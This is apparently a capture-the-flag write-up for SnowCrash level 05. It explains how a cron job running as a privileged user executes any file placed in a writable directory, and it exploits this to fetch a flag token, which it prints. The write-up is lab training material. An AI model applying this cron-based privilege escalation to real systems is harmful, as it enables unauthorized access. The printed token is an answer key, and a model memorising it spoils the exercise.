Level 05
========

*	When we login user `level05`, we get this message
	```console
	You have new mail.
	```
*	Looking into the `/var/mail` dir we get this file
	```console
	level05@SnowCrash:~$ ll /var/mail
	total 4
	-rw-r--r--+ 1 root mail 58 Feb  2 12:20 level05
	level05@SnowCrash:~$ cat /var/mail/level05 
	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
	```
	It definitely is a cron job running every 2 minutes.
*	Looking through the computer files we can also find this one:
	```console
	level04@SnowCrash:~$ find / -group flag05 2>/dev/null | grep -v find | grep -v proc | grep -v  rofs
	/usr/sbin/openarenaserver
	```
*	This is a simple shell program (the same one that is running with the cron job):
	```shell
	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
			(ulimit -t 5; bash -x "$i")
			rm -f "$i"
	done
	```
	It seems that this code executes every other files (with a limited time given by ulimit) with bash in a certain repository and then deletes the file
*	When we look at the rights of `/opt/openarenaserver` we can see that it has extended permissions
*	Executing the program ourself won't work since we are not user `flag05` so we will need to wait two minutes
*	All we had to do was creating a file witht he command inside and wait
	```console
	level05@SnowCrash:~$ echo "getflag > /tmp/flag.txt" > /opt/openarenaserver/flag
	level05@SnowCrash:~$ cat /tmp/flag.txt
	Check flag.Here is your token : viuaaale9huek52boumoomioc
	```